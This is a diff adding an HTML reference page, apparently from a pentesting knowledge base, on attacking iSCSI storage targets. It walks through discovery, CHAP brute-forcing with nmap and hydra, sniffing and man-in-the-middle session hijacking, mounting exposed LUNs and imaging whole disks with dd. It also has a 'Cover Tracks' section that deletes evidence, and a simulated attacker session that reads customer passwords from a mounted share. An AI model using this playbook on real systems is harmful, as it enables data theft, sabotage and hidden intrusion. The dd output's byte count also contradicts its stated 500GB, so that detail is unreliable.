@@ -1,0 +1,203 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">iSCSI Protocol Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network Security</strong> • Focus: <strong>Storage Protocol Exploitation</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    iSCSI (Internet Small Computer Systems Interface) allows SCSI commands to be sent over TCP/IP (default port 3260). 
+    While intended for enterprise storage networks, misconfigured or weakly protected iSCSI targets are common in 
+    penetration tests. Attackers can discover exposed targets, enumerate Logical Unit Numbers (LUNs), 
+    brute-force authentication, hijack sessions, and mount raw storage devices to directly access or manipulate data. 
+    Successful exploitation provides block-level read/write access, enabling massive data theft or sabotage.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Default Port (3260) Exposed:</strong> Often accessible from flat internal networks or misconfigured firewalls.</li>
+    <li><strong>Anonymous / Weak Authentication:</strong> Some iSCSI targets allow discovery or even full access without CHAP authentication.</li>
+    <li><strong>Plaintext Traffic:</strong> Without IPsec, iSCSI traffic (including CHAP handshakes) can be sniffed and replayed.</li>
+    <li><strong>Direct Disk Access:</strong> Exploitation bypasses OS-level access controls, exposing raw filesystems and data.</li>
+    <li><strong>Low Monitoring:</strong> Storage traffic is rarely logged or inspected by IDS/IPS.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Scan networks for port 3260 and identify iSCSI targets.</li>
+    <li><strong>Enumeration:</strong> Use discovery mode to list targets and Logical Units (LUNs).</li>
+    <li><strong>Authentication Attacks:</strong> Exploit misconfigurations, default credentials, or weak CHAP authentication.</li>
+    <li><strong>Session Hijacking:</strong> Capture traffic and hijack iSCSI sessions where IPsec is not enforced.</li>
+    <li><strong>Mounting Volumes:</strong> Attach LUNs as block devices, enabling read/write on raw storage.</li>
+    <li><strong>Impact:</strong> Exfiltrate sensitive data, implant persistence, or corrupt/destroy enterprise storage arrays.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan the network for hosts with TCP/3260 open.</li>
+    <li>Enumerate iSCSI portals and available targets/LUNs.</li>
+    <li>Attempt authentication (anonymous, default, brute-force CHAP).</li>
+    <li>Hijack or replay iSCSI sessions where possible.</li>
+    <li>Mount compromised storage volumes and extract/manipulate data.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p 3260 --script iscsi-info [target]     # Identify iSCSI targets
+nmap -p 3260 --script iscsi-brute [target]    # Attempt brute force CHAP creds
+iscsiadm -m discovery -t sendtargets -p [IP]  # Discover iSCSI targets
+iscsiadm -m discovery -t st -p [IP]           # Alternative discovery mode
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+iscsiadm -m node                              # List discovered targets
+iscsiadm -m session                           # List active sessions
+tcpdump -i eth0 port 3260                     # Sniff iSCSI traffic
+wireshark (filter: tcp.port==3260)            # Deep traffic analysis
+
+# ------------------------------
+# Authentication / Exploitation
+# ------------------------------
+iscsiadm -m node -T [TARGET_NAME] -p [IP] --login        # Attempt login
+iscsiadm -m node -T [TARGET_NAME] -p [IP] --op=update \ 
+  --name node.session.auth.authmethod --value=CHAP       # Configure CHAP
+iscsiadm -m node -T [TARGET_NAME] -p [IP] --op=update \
+  --name node.session.auth.username --value=[USER]
+iscsiadm -m node -T [TARGET_NAME] -p [IP] --op=update \
+  --name node.session.auth.password --value=[PASS]
+
+hydra -L users.txt -P pass.txt iscsi://[IP]              # Brute-force creds (if supported)
+
+# ------------------------------
+# Session Hijacking / Replay
+# ------------------------------
+tcpdump -i eth0 -s0 -w iscsi.pcap port 3260              # Capture handshake
+ettercap / bettercap for MITM on iSCSI                   # Inject/hijack traffic
+iscsiadm -m session --sid=[SESSION_ID]                   # Inspect hijacked session
+
+# ------------------------------
+# Post-Exploitation (Mounting Volumes)
+# ------------------------------
+lsblk                                                    # List attached block devices
+fdisk -l                                                 # Identify new LUN devices
+mount /dev/[device] /mnt/iscsi                           # Mount filesystem
+dd if=/dev/[device] of=disk.img bs=4M status=progress    # Exfiltrate full disk image
+
+# ------------------------------
+# Cleanup / Cover Tracks
+# ------------------------------
+iscsiadm -m node --logout                                # Logout from target
+iscsiadm -m node -o delete -T [TARGET_NAME]              # Remove node record
+rm -rf /var/lib/iscsi/nodes/[TARGET]                     # Remove evidence
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p3260 192.168.1.0/24 --script iscsi-info           # Find iSCSI hosts
+iscsiadm -m discovery -t sendtargets -p 192.168.1.10     # Enumerate targets
+iscsiadm -m node -T iqn.2023-08.example:target -p 192.168.1.10 --login  # Login
+lsblk                                                    # Verify mounted device
+mount /dev/sdb /mnt/iscsi                                # Mount and extract data
+  </pre>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting iSCSI (TCP 3260)
+      </a>
+    </li>
+    <li>
+      <a href="https://man7.org/linux/man-pages/man8/iscsiadm.8.html" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        iscsiadm Linux Manual Page
+      </a>
+    </li>
+    <li>
+      <a href="https://nmap.org/nsedoc/scripts/iscsi-info.html" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        Nmap NSE: iscsi-info Script
+      </a>
+    </li>
+    <li>Red Team reports often highlight iSCSI as an overlooked but devastating attack vector.</li>
+  </ul>
+</section>
+<br>
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p 3260 --script iscsi-info 192.168.1.25
+PORT     STATE SERVICE
+3260/tcp open  iscsi
+| iscsi-info: 
+|   Target: iqn.2025-01.com.example:storage.lun1
+|   Authentication: None required
+|_  LUNs: 1 (500GB)
+
+[ saide ~ ]$ iscsiadm -m discovery -t sendtargets -p 192.168.1.25
+192.168.1.25:3260,1 iqn.2025-01.com.example:storage.lun1
+
+[ saide ~ ]$ iscsiadm -m node -T iqn.2025-01.com.example:storage.lun1 -p 192.168.1.25 --login
+Login to [iface: default, target: iqn.2025-01.com.example:storage.lun1, portal: 192.168.1.25,3260] successful.
+
+[ saide ~ ]$ lsblk
+NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   100G  0 disk /
+sdb      8:16   0   500G  0 disk    <-- iSCSI LUN attached
+
+[ saide ~ ]$ mkdir /mnt/iscsi
+[ saide ~ ]$ mount /dev/sdb /mnt/iscsi
+
+[ saide ~ ]$ ls /mnt/iscsi
+backups/  finance.db  customers.csv  vm_disks/
+
+[ saide ~ ]$ head -5 /mnt/iscsi/customers.csv
+ID,Name,Email,Password
+1,John Doe,john@example.com,MyPassword123
+2,Jane Smith,jane@example.com,SuperSecret!
+3,Ali Khan,ali@example.org,Winter2025!
+4,Maria Rossi,maria@corp.local,P@ssw0rd!
+
+[ saide ~ ]$ dd if=/dev/sdb of=/tmp/lun1.img bs=4M status=progress
+524288000 bytes (500GB) copied, 1200 s, 416 MB/s
+
+[ saide ~ ]$ iscsiadm -m node --logout
+Logout of [target: iqn.2025-01.com.example:storage.lun1, portal: 192.168.1.25,3260] successful.
+
+[ saide ~ ]$ iscsiadm -m node -o delete -T iqn.2025-01.com.example:storage.lun1 -p 192.168.1.25
+Node [iqn.2025-01.com.example:storage.lun1] deleted.
+    </pre>
+  </details>
+</section>
